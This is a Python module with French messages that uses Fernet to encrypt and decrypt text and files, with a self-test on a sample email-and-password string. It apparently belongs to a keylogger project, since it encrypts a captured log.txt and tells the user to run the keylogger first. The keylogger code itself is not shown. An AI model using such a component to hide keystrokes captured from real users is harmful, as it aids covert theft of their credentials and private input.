import os
import base64
from cryptography.fernet import Fernet

KEY_PATH = os.path.join(os.getcwd(), "data", "secret.key")


def generate_key():
    key = Fernet.generate_key()
    with open(KEY_PATH, "wb") as f:
        f.write(key)
    print(f"Cle de chiffrement generee et sauvegardee dans {KEY_PATH}")
    return key


def load_key():
    if not os.path.exists(KEY_PATH):
        return generate_key()
    with open(KEY_PATH, "rb") as f:
        return f.read()


def encrypt_text(text):
    key = load_key()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(text.encode("utf-8"))
    return encrypted


def decrypt_text(encrypted_data):
    key = load_key()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(encrypted_data)
    return decrypted.decode("utf-8")


def encrypt_file(input_path, output_path=None):
    if output_path is None:
        output_path = input_path + ".enc"

    with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    encrypted = encrypt_text(content)

    with open(output_path, "wb") as f:
        f.write(encrypted)

    print(f"Fichier chiffre : {output_path}")
    return output_path


def decrypt_file(input_path, output_path=None):
    if output_path is None:
        output_path = input_path.replace(".enc", ".decrypted.txt")

    with open(input_path, "rb") as f:
        encrypted = f.read()

    decrypted = decrypt_text(encrypted)

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(decrypted)

    print(f"Fichier dechiffre : {output_path}")
    return output_path


if __name__ == "__main__":
    print("=== Test du module de chiffrement ===\n")

    test_text = "Mon email est mathis@gmail.com et mon mdp est Tr0ub4dor&3"
    print(f"Texte original  : {test_text}")

    encrypted = encrypt_text(test_text)
    print(f"Texte chiffre   : {encrypted[:80]}...")

    decrypted = decrypt_text(encrypted)
    print(f"Texte dechiffre : {decrypted}")

    print(f"\nVerification    : {'OK' if test_text == decrypted else 'ERREUR'}")

    log_path = os.path.join(os.getcwd(), "data", "log.txt")
    if os.path.exists(log_path):
        print(f"\n--- Chiffrement du fichier log ---")
        enc_path = encrypt_file(log_path)
        dec_path = decrypt_file(enc_path)

        with open(log_path, "r") as f:
            original = f.read()
        with open(dec_path, "r") as f:
            restored = f.read()
        print(f"Verification fichier : {'OK' if original == restored else 'ERREUR'}")
    else:
        print(f"\nPas de fichier log.txt a chiffrer (lance d'abord le keylogger)")